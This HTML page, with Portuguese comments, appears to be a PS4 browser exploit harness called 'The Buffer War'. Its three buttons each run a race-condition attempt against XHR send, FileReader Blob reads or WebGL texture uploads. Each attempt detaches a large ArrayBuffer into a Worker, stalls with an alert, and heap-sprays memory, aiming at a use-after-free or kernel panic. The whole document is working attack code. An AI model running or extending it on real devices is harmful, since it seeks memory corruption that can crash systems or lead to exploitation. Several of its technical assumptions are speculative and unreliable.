<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v490000: The Buffer War</title>
<style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #0f0; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #020; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #030; color: #fff; border: 2px solid #0f0;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #0f0; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v490000: THE BUFFER WAR</h1>

<div class="status" id="msg">
    ALVO: ESTADO ZUMBI DE FULLSCREEN + UAF<br>
    CLIQUE -> FULLSCREEN -> SIGA INSTRUÇÃO
</div>

<button onclick="war(b01)">01. Network Packet UAF (XHR Send)</button>

<button onclick="war(b02)">02. FileReader Blob Confusion</button>

<button onclick="war(b03)">03. WebGL Texture Upload Race</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    const Msg = document.getElementById('msg');
    
    // Worker Genérico que aceita buffers e não faz nada
    const workerBlob = new Blob(["onmessage=function(e){ postMessage('done'); }"], {type:'text/javascript'});
    const workerUrl = URL.createObjectURL(workerBlob);

    // Spray Global
    let spray_store = [];

    function war(vectorFunc) {
        Stage.innerHTML = "";
        spray_store = [];
        
        // 1. Configura
        const target = vectorFunc(Stage);
        
        // 2. Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. Execução
        requestAnimationFrame(() => {
            setTimeout(() => {
                if(target._exec) target._exec();
            }, 500);
        });
    }

    // =================================================================
    // 01. Network Packet UAF (XHR Send)
    // Tenta enviar um Buffer pela rede (XHR). Enquanto o driver de rede
    // prepara o pacote, transferimos o buffer para um Worker.
    // O Alerta pausa o JS, mas o driver de rede continua tentando ler.
    // =================================================================
    function b01(stage) {
        const d = document.createElement('div');
        d.innerText = "NETWORK RACE";
        stage.appendChild(d);

        // Cria Worker
        const w = new Worker(workerUrl);
        
        // Cria Buffer Grande (16MB)
        const buffer = new ArrayBuffer(1024 * 1024 * 16);
        const view = new Uint8Array(buffer);
        view.fill(0x41); // Enche de 'A'

        d._exec = () => {
            Msg.innerText = ">>> CLIQUE OK RAPIDAMENTE <<<";
            
            // 1. Inicia envio assíncrono (AJAX)
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "/crash_test", true); // URL falsa
            
            // O driver de rede começa a ler 'view' aqui
            try { xhr.send(view); } catch(e){} 
            
            // 2. IMEDIATAMENTE transfere a memória para o Worker (Detach)
            // A memória é removida da Thread Principal
            w.postMessage(buffer, [buffer]);
            
            // 3. PAUSA BRUTAL
            // Se o driver de rede tentar ler o buffer durante esta pausa -> Kernel Panic
            window.alert("⚠️ NETWORK DETACHED ⚠️\nAo clicar OK, verificaremos se o driver de rede sobreviveu.");
            
            // 4. Se sobreviveu, tentamos sujar a memória liberada
            for(let i=0; i<1000; i++) spray_store.push(new Uint32Array(1024).fill(0xDEADBEEF));
            
            d.innerText = "Sobreviveu. Tente Refresh agora.";
        };
        return d;
    }

    // =================================================================
    // 02. FileReader Blob Confusion
    // Cria um Blob a partir de um buffer, inicia leitura, e desanexa
    // o buffer original no meio do processo.
    // =================================================================
    function b02(stage) {
        const d = document.createElement('div');
        d.innerText = "FILE READER RACE";
        stage.appendChild(d);

        const w = new Worker(workerUrl);
        
        // Buffer Vítima
        const buffer = new ArrayBuffer(1024 * 1024 * 10); // 10MB
        const view = new Uint8Array(buffer);
        view.fill(0x42);

        // Cria Blob apontando para essa memória
        const blob = new Blob([view]);
        const reader = new FileReader();

        d._exec = () => {
            Msg.innerText = ">>> AGUARDE O ALERTA <<<";
            
            // 1. Inicia leitura do Blob
            reader.readAsArrayBuffer(blob);
            
            // 2. Transfere o buffer original (Destrói a fonte do Blob?)
            // Dependendo da implementação, o Blob pode manter referência ou copiar.
            // Se for Zero-Copy, isso causa UAF.
            w.postMessage(buffer, [buffer]);
            
            // 3. PAUSA
            window.alert("⚠️ READER CONFUSION ⚠️\nO Blob aponta para memória movida.\nClique OK.");
            
            // 4. Spray
            const spray = new Float64Array(100000).fill(1.1);
            spray_store.push(spray);
        };
        return d;
    }

    // =================================================================
    // 03. WebGL Texture Upload Race
    // Tenta enviar o buffer para a GPU como textura.
    // WebGL valida os dados, mas se pausarmos com Alerta no meio,
    // podemos confundir a validação.
    // =================================================================
    function b03(stage) {
        const d = document.createElement('div');
        d.innerText = "WEBGL RACE";
        stage.appendChild(d);

        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        
        if(!gl) { d.innerText = "NO WEBGL"; return d; }

        const w = new Worker(workerUrl);
        const buffer = new ArrayBuffer(1024 * 1024 * 4); // 4MB Texture
        const view = new Uint8Array(buffer);
        view.fill(255);

        const texture = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, texture);

        d._exec = () => {
            Msg.innerText = ">>> CLIQUE OK <<<";
            
            // 1. Prepara upload
            // texImage2D lê do buffer
            
            // 2. Race: Detach buffer ANTES do comando GL terminar?
            // Difícil sincronizar, mas o Alert ajuda.
            
            w.postMessage(buffer, [buffer]);
            
            // 3. Tenta subir textura de buffer morto
            try {
                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1024, 1024, 0, gl.RGBA, gl.UNSIGNED_BYTE, view);
            } catch(e) {
                // Erro JS esperado
            }
            
            // 4. PAUSA IMEDIATA
            window.alert("⚠️ GPU UPLOAD PAUSED ⚠️\nO driver de vídeo tentou ler o buffer?");
            
            // 5. Destruição
            gl.deleteTexture(texture);
            spray_store.push(new ArrayBuffer(1024*1024));
        };
        return d;
    }

</script>
</body>
</html>
